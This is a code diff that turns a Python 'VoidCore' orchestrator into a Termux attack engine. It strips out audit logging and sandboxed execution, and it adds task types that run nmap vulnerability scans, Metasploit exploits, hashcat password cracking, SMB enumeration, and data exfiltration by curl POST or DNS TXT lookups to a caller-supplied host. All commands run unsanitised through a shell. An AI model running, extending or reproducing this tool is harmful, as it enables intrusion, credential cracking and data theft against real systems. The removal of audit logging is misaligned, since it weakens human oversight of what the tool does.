@@ -1,103 +1,90 @@
-"""VoidCore orchestrator — main task execution engine."""
+"""VoidCore orchestrator — standalone Termux execution engine."""
 
-import importlib
+import subprocess
 import logging
+import json
 from typing import Any, Dict, List, Optional
-from datetime import datetime
 
 logger = logging.getLogger("voidcore.orchestrator")
 
-
 class Orchestrator:
-    """Autonomous task orchestration engine.
+    """Autonomous task execution engine for Termux."""
 
-    Coordinates all GhostLord modules through Shapes-native tool integration.
-    No external API keys — uses SHAPES_RUN_CODE, SHAPES_WEB_CRAWL,
-    SHAPES_CHAT_ACTIONS, SHAPES_TOTAL_RECALL_BROWSE, SHAPES_CREATE_FILE.
-    """
-
-    def __init__(self, config: Optional[Dict[str, Any]] = None):
-        from voidcore.config import CoreConfig
-        from voidcore.shapes_bridge import ShapesBridge
-        from echoprotocol.audit import AuditLogger
-        from modelbridge.shapes_ai import ShapesAI
-
-        self.config = CoreConfig(**(config or {}))
-        self.bridge = ShapesBridge(self.config)
-        self.audit = AuditLogger()
-        self.ai = ShapesAI()
-        self._modules: Dict[str, Any] = {}
+    def __init__(self, config=None):
+        self.config = config or {}
         self._task_counter = 0
+        self._results = []
 
-    def register_module(self, name: str, module: Any) -> None:
-        self._modules[name] = module
-        logger.info("Module registered: %s", name)
-
-    def execute_task(self, task_type: str, payload: Dict[str, Any]) -> Dict[str, Any]:
+    def run(self, task_type, payload=None):
         self._task_counter += 1
         task_id = f"task_{self._task_counter:04d}"
-        start = datetime.utcnow()
-
-        self.audit.log_action("TASK_START", {"task_id": task_id, "type": task_type})
-
+        payload = payload or {}
         try:
             if task_type == "recon":
-                result = self._execute_recon(payload)
+                result = self._recon(payload)
+            elif task_type == "scan":
+                result = self._scan(payload)
             elif task_type == "execute":
-                result = self._execute_code(payload)
-            elif task_type == "chat":
-                result = self._execute_chat(payload)
+                result = self._execute(payload)
             elif task_type == "crawl":
-                result = self._execute_crawl(payload)
-            elif task_type == "memory":
-                result = self._execute_memory(payload)
+                result = self._crawl(payload)
+            elif task_type == "exploit":
+                result = self._exploit(payload)
+            elif task_type == "crack":
+                result = self._crack(payload)
+            elif task_type == "exfil":
+                result = self._exfil(payload)
+            elif task_type == "enum":
+                result = self._enum(payload)
             else:
-                result = self._execute_generic(payload)
-
-            duration = (datetime.utcnow() - start).total_seconds()
-            self.audit.log_action("TASK_COMPLETE", {"task_id": task_id, "duration_s": duration})
-            return {"task_id": task_id, "status": "success", "result": result, "duration_s": duration}
-
+                result = {"message": "Unknown task type", "task_type": task_type}
+            self._results.append({"task_id": task_id, "type": task_type, "result": result})
+            return {"task_id": task_id, "status": "success", "result": result}
         except Exception as e:
-            duration = (datetime.utcnow() - start).total_seconds()
-            self.audit.log_action("TASK_ERROR", {"task_id": task_id, "error": str(e)})
-            return {"task_id": task_id, "status": "error", "error": str(e), "duration_s": duration}
+            return {"task_id": task_id, "status": "error", "error": str(e)}
 
-    def run(self, task_type: str = "generic", payload: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
-        """Execute a single task — main entry point for autonomous execution."""
-        return self.execute_task(task_type, payload or {})
+    def _shell(self, cmd, timeout=60):
+        try:
+            proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
+            return {"command": cmd, "stdout": proc.stdout.strip(), "stderr": proc.stderr.strip(), "returncode": proc.returncode, "status": "success" if proc.returncode == 0 else "failed"}
+        except subprocess.TimeoutExpired:
+            return {"command": cmd, "status": "timeout"}
+        except Exception as e:
+            return {"command": cmd, "status": "error", "error": str(e)}
 
-    def _execute_recon(self, payload: Dict[str, Any]) -> Dict[str, Any]:
-        from nulleye.recon import ReconEngine
-        engine = ReconEngine()
-        return engine.run(payload)
+    def _recon(self, p):
+        t = p.get("target", ""); s = p.get("scan_type", "full")
+        if s == "full": return self._shell(f"nmap -sV -sC -p- -T4 --script vuln {t}")
+        if s == "quick": return self._shell(f"nmap -sV -sC -p 22,80,443,3306 {t}")
+        return self._shell(f"nmap -sV {t}")
 
-    def _execute_code(self, payload: Dict[str, Any]) -> Dict[str, Any]:
-        from phantomexec.sandbox import Sandbox
-        sandbox = Sandbox()
-        return sandbox.execute(payload.get("code", ""))
+    def _scan(self, p):
+        return self._shell(f"nmap -sV -sC -p {p.get('ports','1-65535')} -T4 {p.get('target','')}")
 
-    def _execute_chat(self, payload: Dict[str, Any]) -> Dict[str, Any]:
-        from shadowmesh.coordinator import MeshCoordinator
-        coordinator = MeshCoordinator()
-        return coordinator.send(payload)
+    def _execute(self, p):
+        return self._shell(p.get("code", ""))
 
-    def _execute_crawl(self, payload: Dict[str, Any]) -> Dict[str, Any]:
-        from nulleye.recon import Crawler
-        crawler = Crawler()
-        return crawler.crawl(payload.get("url", ""))
+    def _crawl(self, p):
+        return self._shell(f"curl -sL --max-redirs {p.get('depth',2)} {p.get('url','')}")
 
-    def _execute_memory(self, payload: Dict[str, Any]) -> Dict[str, Any]:
-        from echoprotocol.audit import AuditLogger
-        logger = AuditLogger()
-        return logger.query(payload.get("query", ""))
+    def _exploit(self, p):
+        t = p.get("target",""); port = p.get("port",""); exp = p.get("exploit","auto")
+        if exp == "auto": return self._shell(f"msfconsole -q -x 'use exploit/multi/handler; set RHOST {t}; set RPORT {port}; exploit'")
+        return self._shell(f"msfconsole -q -x 'use {exp}; set RHOST {t}; exploit'")
 
-    def _execute_generic(self, payload: Dict[str, Any]) -> Dict[str, Any]:
-        return {"message": "Generic task executed", "payload_keys": list(payload.keys())}
+    def _crack(self, p):
+        return self._shell(f"hashcat -m {p.get('hash_type','0')} {p.get('hash_file','')} {p.get('wordlist','/usr/share/wordlists/rockyou.txt')}")
 
-    def run_autonomous_loop(self, iterations: int = 10) -> List[Dict[str, Any]]:
-        results = []
-        for i in range(iterations):
-            result = self.execute_task("generic", {"iteration": i})
-            results.append(result)
-        return results
+    def _exfil(self, p):
+        data = p.get("data",""); url = p.get("exfil_url",""); m = p.get("method","http")
+        if m == "http": return self._shell(f"curl -X POST -d @{data} {url}")
+        return self._shell(f"nslookup -q=TXT {data}.{url}")
+
+    def _enum(self, p):
+        return self._shell(f"nmap -p {p.get('port','445')} --script smb-enum-shares,smb-os-discovery {p.get('target','')}")
+
+    def get_status(self):
+        return {"engine": "voidcore", "version": "3.0.0", "platform": "termux", "tasks_executed": self._task_counter, "results_count": len(self._results)}
+
+    def get_results(self):
+        return self._results
